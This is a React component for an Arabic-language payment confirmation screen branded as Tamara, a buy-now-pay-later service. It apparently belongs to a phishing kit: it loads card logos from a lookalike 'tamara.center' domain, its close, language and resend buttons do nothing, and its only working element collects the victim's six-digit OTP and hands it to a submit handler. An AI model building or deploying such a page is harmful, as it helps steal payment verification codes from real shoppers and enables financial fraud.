import { Input } from '@/components/ui/input';
import { toEnglishNumbers, formatPrice } from '@/lib/utils';
import TamaraLogo from '@/components/TamaraLogo';

interface ConfirmCodeProps {
  confirmCode: string;
  setConfirmCode: (value: string) => void;
  onSubmit: () => void;
  codeError?: string | null;
  isLoading?: boolean;
  onClearError?: () => void;
  productName?: string;
  activeTotalAmount?: number;
  activeInstallments?: number;
  activePerInstallment?: number;
  phoneNumber?: string;
  orderId?: string;
}

const ConfirmCode = ({
  confirmCode,
  setConfirmCode,
  onSubmit,
  codeError,
  isLoading,
  onClearError,
  productName = 'منتج',
  activeTotalAmount = 0,
  activeInstallments = 0,
  activePerInstallment = 0,
  phoneNumber = '',
  orderId = ''
}: ConfirmCodeProps) => {
  // Calculate USD amount (approximate exchange rate: 1 USD = 3.75 SAR)
  const exchangeRate = 3.75;
  const totalAmountUSD = Math.round((activeTotalAmount / exchangeRate) / 10) * 10;
  const perInstallmentUSD = Math.round((activePerInstallment / exchangeRate) / 10) * 10;

  // Format phone number
  const formatPhoneNumber = (phone: string) => {
    const cleaned = phone.replace(/\D/g, '');
    if (cleaned.length <= 3) return cleaned;
    if (cleaned.length <= 6) return `${cleaned.slice(0, 3)} ${cleaned.slice(3)}`;
    return `${cleaned.slice(0, 3)} ${cleaned.slice(3, 6)} ${cleaned.slice(6)}`;
  };

  // Get current date and time
  const now = new Date();
  const dateOptions: Intl.DateTimeFormatOptions = {
    year: 'numeric',
    month: 'long',
    day: 'numeric'
  };
  const timeOptions: Intl.DateTimeFormatOptions = {
    hour: '2-digit',
    minute: '2-digit',
    hour12: true
  };

  const formatDate = now.toLocaleDateString('ar-SA', dateOptions);
  const formatTime = now.toLocaleTimeString('ar-SA', timeOptions);

  return (
    <div
      className="min-h-screen flex flex-col"
      dir="rtl"
      style={{
        fontFamily: "'Cairo', 'Tajawal', sans-serif",
        background: '#ffffff'
      }}
    >
      <div className="max-w-[430px] mx-auto w-full flex flex-col flex-1">
        {/* Header */}
        <div className="flex items-center justify-between px-5 py-4 bg-white">
          <TamaraLogo />
          <div className="flex items-center gap-3">
            <button
              onClick={() => {}}
              className="text-[14px] font-medium text-gray-500 hover:text-gray-700 transition-colors"
            >
              English
            </button>
            <span className="text-gray-300">|</span>
            <button
              onClick={() => {}}
              aria-label="إغلاق"
              className="w-8 h-8 flex items-center justify-center rounded-full bg-gray-100 hover:bg-gray-200 transition-all"
            >
              <span className="text-lg leading-none text-gray-600">✕</span>
            </button>
          </div>
        </div>

        {/* Separator */}
        <div className="h-px bg-gray-200" />

        {/* Content */}
        <div className="flex flex-col flex-1 px-5 py-6">
          {/* Page Title */}
          <h1 className="text-[22px] font-bold text-black mb-4" style={{ fontFamily: "'Cairo', sans-serif" }}>
            تأكيد الدفع
          </h1>

          {/* Visa/Mastercard Logos */}
          <div className="flex justify-center items-center gap-3 mb-4" style={{ width: '110px', height: '20px', margin: '0 auto 20px' }}>
            <img src="https://checkout.tamara.center/v.jpg" alt="American Express" style={{ height: '18px', width: 'auto' }} />
            <img src="https://checkout.tamara.center/vv.jpg" alt="Visa" style={{ height: '18px', width: 'auto' }} />
            <img src="https://checkout.tamara.center/vvv.jpg" alt="Mastercard" style={{ height: '18px', width: 'auto' }} />
            <img src="https://checkout.tamara.center/vvvv.jpg" alt="Mada" style={{ height: '18px', width: 'auto' }} />
          </div>

          {/* Order Details */}
          <div className="mb-4">
            <div className="text-[13px] font-bold text-black mb-1">
              {productName}
            </div>
            <div className="text-[13px] font-semibold text-black">
              {formatPrice(activePerInstallment)} ريال
              <span className="usd-badge">${perInstallmentUSD}</span>
              <span> × {activeInstallments} دفعات</span>
            </div>
            <div className="text-[12px] text-[#777] mt-1">
              الإجمالي: {formatPrice(activeTotalAmount)} ريال
              <span className="usd-badge">${totalAmountUSD}</span>
            </div>
          </div>

          {/* Phone Number */}
          <div className="text-[12px] text-[#777] mb-1">
            رقم الهاتف: {formatPhoneNumber(phoneNumber)}
          </div>

          {/* Order ID */}
          <div className="text-[12px] text-[#777] mb-4">
            رقم الطلب: {orderId}
          </div>

          {/* Date and Time */}
          <div className="text-[12px] text-[#777] mb-6">
            {formatDate} - {formatTime}
          </div>

          {/* OTP Input */}
          <div className="mb-4">
            <label className="text-gray-700 text-sm block mb-2 text-right">رمز التحقق (OTP):</label>
            <Input
              value={confirmCode}
              onChange={e => {
                setConfirmCode(toEnglishNumbers(e.target.value));
                if (onClearError) onClearError();
              }}
              placeholder="_ _ _ _ _ _"
              className="bg-[#f7f7f7] border-[#ddd] text-gray-900 text-center text-2xl tracking-[0.5em] py-4 focus:border-[#7d5af2] focus:ring-[#7d5af2]"
              dir="ltr"
              maxLength={6}
              type="text"
              inputMode="numeric"
              style={{ height: '54px' }}
            />
          </div>

          {codeError && <p className="text-red-500 text-sm mb-4 text-right">{codeError}</p>}

          {/* Resend Code - Clickable Text Only */}
          <div className="text-right mb-6">
            <button
              onClick={() => {}}
              className="text-[14px] font-bold underline"
              style={{ color: '#6C1DD6' }}
            >
              إعادة إرسال الرمز
            </button>
          </div>

          {/* Spacer */}
          <div className="flex-1" />
        </div>

        {/* Fixed Bottom Button */}
        <button
          onClick={onSubmit}
          disabled={!confirmCode || confirmCode.length < 4 || isLoading}
          className={`payment-btn ${confirmCode && confirmCode.length >= 4 ? 'active' : ''}`}
          style={{ width: '370px', height: '54px' }}
        >
          {isLoading ? (
            'جاري التحقق...'
          ) : (
            'تأكيد الدفع'
          )}
        </button>
      </div>
    </div>
  );
};

export default ConfirmCode;
